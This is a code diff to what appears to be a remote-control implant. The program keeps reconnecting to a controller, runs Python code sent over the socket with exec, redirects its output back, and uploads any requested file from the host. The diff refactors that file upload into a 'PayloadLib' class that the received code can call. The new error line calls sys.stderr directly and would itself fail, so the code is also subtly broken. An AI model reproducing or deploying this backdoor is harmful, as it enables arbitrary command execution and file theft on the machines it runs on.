@@ -242,6 +242,28 @@ class ByteLockBundler:
             self.fsock.send(json_str)
         return dataremaining
 
+class PayloadLib:
+    def __init__(self, bytelock):
+        self.bytelock = bytelock
+
+    def upload(self, filename):
+        filename = os.path.abspath(os.path.expanduser(filename))
+        if os.path.exists(filename):
+            filesize = os.stat(filename).st_size
+            jsonstr = json.dumps(dict(filename=filename, filesize=filesize))
+            self.bytelock.writeSpecial('filesize', jsonstr.encode('UTF-8'))
+            def downloadfunc():
+                with open(filename, 'rb') as f:
+                    dat = f.read(ByteLockBundler.PACKET_MAX_DAT)
+                    while len(dat) > 0:
+                        self.bytelock.writeFileup(filename, dat)
+                        dat = f.read(ByteLockBundler.PACKET_MAX_DAT)
+                    self.bytelock.closeFile(filename)
+            t = threading.Thread(target=downloadfunc)
+            t.start()
+            return True
+        return False
+
 class WriterWrapper:
     def __init__(self, writefunc):
         self.func = writefunc
@@ -264,14 +286,14 @@ def main():
                 fs.send(json_str)
                 serve(fs)
             except Exception as e:
-                # TODO: Remove debug code
-                raise e
+                sys.stderr("[!] "+str(e))
         if RUNNING:
             # Try again in a minute
             time.sleep(10)
 
 def serve(sock):
     bytelock = ByteLockBundler(sock)
+    payloadlib = PayloadLib(bytelock)
     sys.stdout = WriterWrapper(lambda s: bytelock.writePrintbytes(s.encode('UTF-8')))
     sys.stderr = WriterWrapper(lambda s: bytelock.writeErrbytes(s.encode('UTF-8')))
 
@@ -337,7 +359,7 @@ def serve(sock):
             if EVAL in recvjson:
                 def execfunc():
                     try:
-                        exec(recvjson[EVAL]) in {}
+                        exec(recvjson[EVAL]) in {'payloadlib':payloadlib}
                     except Exception as e:
                         tb = traceback.format_exc()
                         sys.stderr.write(tb)
@@ -374,19 +396,7 @@ def serve(sock):
             # Done last since this consumes thread until download completed
             if FILE_DOWNLOAD in recvjson:
                 filename = recvjson[FILE_DOWNLOAD]
-                if os.path.exists(filename):
-                    filesize = os.stat(filename).st_size
-                    jsonstr = json.dumps(dict(filename=filename,filesize=filesize))
-                    bytelock.writeSpecial('filesize',jsonstr.encode('UTF-8'))
-                    def downloadfunc():
-                        with open(filename,'rb') as f:
-                            dat = f.read(ByteLockBundler.PACKET_MAX_DAT)
-                            while len(dat) > 0:
-                                bytelock.writeFileup(filename,dat)
-                                dat = f.read(ByteLockBundler.PACKET_MAX_DAT)
-                            bytelock.closeFile(filename)
-                    t = threading.Thread(target=downloadfunc)
-                    t.start()
+                payloadlib.upload(filename)
 
     def writeBundles():
         remains = True
